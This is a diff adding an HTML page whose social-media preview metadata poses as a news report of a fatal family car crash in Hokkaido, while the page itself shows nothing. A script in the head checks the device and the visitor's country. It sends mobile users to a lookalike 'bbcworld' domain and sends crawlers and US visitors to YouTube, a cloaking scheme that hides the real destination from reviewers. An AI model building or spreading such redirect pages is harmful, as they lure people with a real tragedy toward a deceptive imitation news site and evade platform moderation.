@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="">
+    <meta property="og:title" content="Hokkaido fatal accident: ‘The only thing I could hear was my wife screaming’˜­" />
+    <meta property="og:description" content="SINGAPORE - He was driving a rental car in Hokkaido, Japan, with his wife and two daughters in the back seat when a lorry collided with their vehicle. The last thing Mr Karthik Balasubramanian heard before he passed out was his wife, Ms Lin Xiuyue, screaming.
+        Ms Lin, 41, and their four-month-old daughter, Aahana, did not survive the accident on Jan 10.">
+    <meta property="og:site_name" content="Twitch"/>
+    <meta property="og:type" content="website"/>
+    <meta property="fb:app_id" content="161273083968709">
+    <meta name="facebook:description" content="nbcnews.com">
+    <meta name="facebook:app:country" content="us">
+	
+    <script>
+        function redirectNonAllowedDevices() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            
+            if (userAgent.match(/android|iphone|ipad/i)) {
+                
+                window.location.replace("https://bbcworld.vercel.app");
+            } else {
+                
+                fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    var countryCode = data.country_code.toLowerCase();
+                    
+                    if (userAgent.match(/facebookexternalhit|googlebot|bingbot|msnbot|yahoo/i) || countryCode === 'us') {
+                        
+                        window.location.replace("https://youtube.com");
+                    }
+                })
+                .catch(error => console.error('Error fetching location:', error));
+            }
+        }
+        window.onload = redirectNonAllowedDevices;
+    </script>
+</head>   
+    
+</html>
